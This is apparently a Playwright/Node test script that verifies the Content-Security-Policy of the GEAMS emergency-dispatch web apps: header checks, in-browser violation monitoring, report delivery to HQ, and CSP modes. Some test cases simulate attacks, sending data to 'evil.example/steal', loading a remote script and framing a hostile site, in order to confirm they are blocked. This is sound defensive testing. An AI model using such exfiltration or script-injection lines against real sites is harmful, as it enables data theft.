const { chromium } = require('playwright');const fs=require('fs'),{spawn}=require('child_process');const sleep=ms=>new Promise(r=>setTimeout(r,ms));
let pass=0,fail=0;const ok=(n,c,x)=>{c?pass++:fail++;console.log((c?'PASS ':'FAIL ')+n+(c?'':'  '+String(typeof x==='string'?x:JSON.stringify(x)).slice(0,300)))};
const B='http://localhost:8063',APPS=['geams-civilian-app.html','geams-dispatch-app.html','geams-fire-service.html','geams-ambulance-service.html','geams-station-dashboard__1_.html','geams-hq-dashboard__1_.html'];
const J=async(m,p,t,b)=>{const r=await fetch(B+p,{method:m,headers:{'Content-Type':'application/json',...(t?{Authorization:'Bearer '+t}:{})},body:b?JSON.stringify(b):undefined});let j={};try{j=await r.json()}catch(e){}return{s:r.status,j}};
(async()=>{const R='/tmp/gcsp';fs.rmSync(R,{recursive:true,force:true});fs.mkdirSync(R,{recursive:true});
 const env={...process.env,PORT:'8063',GEAMS_DATA:R+'/d.json',GEAMS_HQ_USERS:R+'/u.json',GEAMS_HQ_ADMIN_PASSWORD:'Test-Owner-Pass-1',GEAMS_SEED_DEFAULT_STATIONS:'1',GEAMS_BACKUP_HOURS:'0'};
 let srv=spawn('node',['geams-server.js'],{env});await sleep(2500);
 const hq=(await J('POST','/api/hq/login',null,{username:'hqadmin',password:'Test-Owner-Pass-1'})).j.token;
 for(const f of APPS){const r=await fetch(B+'/'+f);const h=r.headers.get('content-security-policy')||'';
  ok(f+': policy is sent',/default-src 'self'/.test(h)&&/object-src 'none'/.test(h)&&/frame-ancestors 'self'/.test(h)&&/base-uri 'self'/.test(h),h.slice(0,80));}
 const h=(await fetch(B+'/geams-civilian-app.html')).headers.get('content-security-policy');
 ok('scripts from other sites are not allowed',!/script-src[^;]*https?:/.test(h.replace(/blob:/,'')),h);
 ok('data can only go to this server and the map/route/search hosts',/connect-src 'self' https:\/\/photon\.komoot\.io https:\/\/router\.project-osrm\.org/.test(h)&&!/connect-src[^;]*\*[^.]/.test(h),h);
 ok('API answers carry no page policy (not needed)',!(await fetch(B+'/api/health')).headers.get('content-security-policy'));
 // browser: no page of ours violates its own policy
 const br=await chromium.launch();const viol={};
 for(const f of APPS){const c=await br.newContext({geolocation:{latitude:7.15,longitude:0.47},permissions:['geolocation']});await c.route(/cdnjs|unpkg|jsdelivr|tile|arcgis|openstreetmap|photon|osrm/,r=>r.abort());const P=await c.newPage();viol[f]=[];
  await P.exposeFunction('__v',(m)=>viol[f].push(m));await P.addInitScript(()=>{document.addEventListener('securitypolicyviolation',e=>window.__v(e.violatedDirective+' '+e.blockedURI+' '+(e.sourceFile||'')+':'+e.lineNumber))});
  await P.goto(B+'/'+f);await sleep(3500);
  if(f.includes('civilian')){await P.evaluate(()=>{CivilianData.user.id='CIV-10001';CivilianData.user.name='A';CivilianData.user.phone='0200000001';CivilianData.user.pin='1234';CivilianData.saveAccount();document.getElementById('pin-gate').classList.add('hidden');CivilianApp.enterApp()});await sleep(1500);for(const s of ['emergency','report','track','chat','profile'])await P.evaluate((s)=>CivilianApp.navigate(s),s).catch(()=>{}),await sleep(700);
   await P.evaluate(()=>{PinGate.showSignup&&document.getElementById('pin-gate').classList.remove('hidden','fading');PinGate.showSignup()}).catch(()=>{});await sleep(500);await P.evaluate(()=>{document.getElementById('su-name')&&0}).catch(()=>{});}
  if(f.includes('hq')){await P.fill('#hq-user','hqadmin');await P.fill('#hq-pass','Test-Owner-Pass-1');await P.evaluate(()=>HqAuth.submit({preventDefault(){}}));await sleep(3500);await P.evaluate(()=>{HqOps.retention()}).catch(()=>{});await sleep(800);}
  ok(f+': no violations of its own policy',viol[f].length===0,viol[f]);await c.close();}
 // the policy really blocks what it is meant to block
 {const c=await br.newContext();const P=await c.newPage();await P.goto(B+'/geams-hq-dashboard__1_.html');await sleep(1500);
  const r1=await P.evaluate(async()=>{try{await fetch('https://evil.example/steal',{mode:'no-cors'});return 'sent'}catch(e){return 'blocked'}});
  ok('script cannot send data to another site',r1==='blocked',r1);
  const r2=await P.evaluate(()=>new Promise(res=>{const s=document.createElement('script');s.src='https://evil.example/x.js';s.onload=()=>res('loaded');s.onerror=()=>res('blocked');document.head.appendChild(s);setTimeout(()=>res('blocked'),3000)}));
  ok('a script from another site is not loaded',r2==='blocked',r2);
  const r3=await P.evaluate(()=>new Promise(res=>{document.addEventListener('securitypolicyviolation',e=>res(e.violatedDirective==='frame-src'||e.effectiveDirective==='frame-src'?'blocked':'other:'+e.violatedDirective));const f=document.createElement('iframe');f.src='https://evil.example/';document.body.appendChild(f);setTimeout(()=>res('not blocked'),3000)}));
  ok('no framing other sites inside our pages',r3==='blocked',r3);
  const r4=await P.evaluate(()=>{const b=document.createElement('base');b.href='https://evil.example/';document.head.appendChild(b);return document.baseURI});
  ok('a <base> tag cannot redirect our links',!/evil\.example/.test(r4),r4);
  await c.close();}
 // reports reach HQ
 await J('POST','/api/csp-report',null,{'csp-report':{'violated-directive':'connect-src','blocked-uri':'https://evil.example','document-uri':B+'/geams-hq-dashboard__1_.html'}});
 const L=(await J('GET','/api/clientlog',hq)).j;ok('a violation report shows in HQ app errors',L.groups.some(g=>g.app==='CSP'&&/evil\.example/.test(g.msg)),L);
 // modes
 srv.kill();await sleep(800);
 for(const [mode,exp] of [['report','content-security-policy-report-only'],['off',null]]){const s=spawn('node',['geams-server.js'],{env:{...env,GEAMS_CSP:mode}});await sleep(2500);const r=await fetch(B+'/geams-hq-dashboard__1_.html');
  ok('GEAMS_CSP='+mode,exp?(!!r.headers.get(exp)&&!r.headers.get('content-security-policy')):(!r.headers.get('content-security-policy')&&!r.headers.get('content-security-policy-report-only')));s.kill();await sleep(800);}
 const s=spawn('node',['geams-server.js'],{env:{...env,GEAMS_TILE_URL:'https://tiles.mygov.gh/{z}/{x}/{y}.png',GEAMS_ROUTE_URL:'https://route.mygov.gh'}});await sleep(2500);
 const hh=(await fetch(B+'/geams-hq-dashboard__1_.html')).headers.get('content-security-policy');ok('own tile and route servers are allowed automatically',/img-src[^;]*https:\/\/tiles\.mygov\.gh/.test(hh)&&/connect-src[^;]*https:\/\/route\.mygov\.gh/.test(hh),hh);s.kill();
 await br.close();console.log('\n'+pass+' passed, '+fail+' failed');process.exit(fail?1:0);})().catch(e=>{console.log('ERR',e.stack);process.exit(2)});
